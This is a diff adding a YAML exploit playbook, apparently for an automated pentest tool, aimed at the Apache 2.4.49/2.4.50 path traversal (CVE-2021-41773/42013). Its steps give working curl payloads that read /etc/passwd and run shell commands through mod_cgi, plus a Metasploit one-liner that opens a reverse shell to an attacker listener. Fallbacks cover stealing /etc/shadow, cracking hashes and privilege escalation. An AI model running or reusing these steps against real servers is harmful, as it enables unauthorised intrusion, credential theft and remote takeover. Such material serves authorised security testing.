@@ -1,0 +1,40 @@
+id: service_apache_2_4_49_traversal
+title: "Apache 2.4.49/2.4.50 path traversal → RCE (CVE-2021-41773 / CVE-2021-42013)"
+phase: exploit
+mitre: ["T1190", "T1059.004"]
+trigger:
+  services: ["http", "https", "apache"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["apache 2.4.49", "apache 2.4.50", "apache/2.4.49", "apache/2.4.50"]
+  cves: ["CVE-2021-41773", "CVE-2021-42013"]
+keywords:
+  - "apache 2.4.49"
+  - "apache 2.4.50"
+  - "cve-2021-41773"
+  - "cve-2021-42013"
+  - "path traversal apache"
+  - "mod_cgi rce"
+preconditions:
+  - "Server header confirms Apache/2.4.49 or 2.4.50"
+  - "Default ``<Directory />`` lacks ``Require all denied`` (vulnerable config)"
+steps:
+  - tool: curl
+    cmd:  "curl -s -i --path-as-is '{base_url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'"
+    why:  "Read /etc/passwd via traversal — confirms vulnerability"
+  - tool: curl
+    cmd:  "curl -s -i --path-as-is '{base_url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'"
+    why:  "If mod_cgi enabled → command execution as Apache user"
+  - tool: nuclei
+    cmd:  "nuclei -t http/cves/2021/CVE-2021-41773.yaml,http/cves/2021/CVE-2021-42013.yaml -u {base_url}"
+    why:  "Confirm exploitation primitives + variants"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/apache_normalize_path_rce; set RHOSTS {target}; set RPORT {port}; set LHOST {LHOST}; set LPORT {LPORT}; run'"
+    why:  "Reverse shell when CGI is on"
+expected_outcome: "File read at minimum; reverse shell as ``daemon``/``apache`` if mod_cgi enabled"
+fallbacks:
+  - "If 403 on /cgi-bin/ → traversal still works for file read at /icons/, /usr-share/"
+  - "If only file-read works → grab /etc/shadow if Apache runs as root, then crack hashes"
+  - "Privesc next via SUID / sudo NOPASSWD / cron writable scripts"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"
+  - "https://github.com/blasty/CVE-2021-41773"
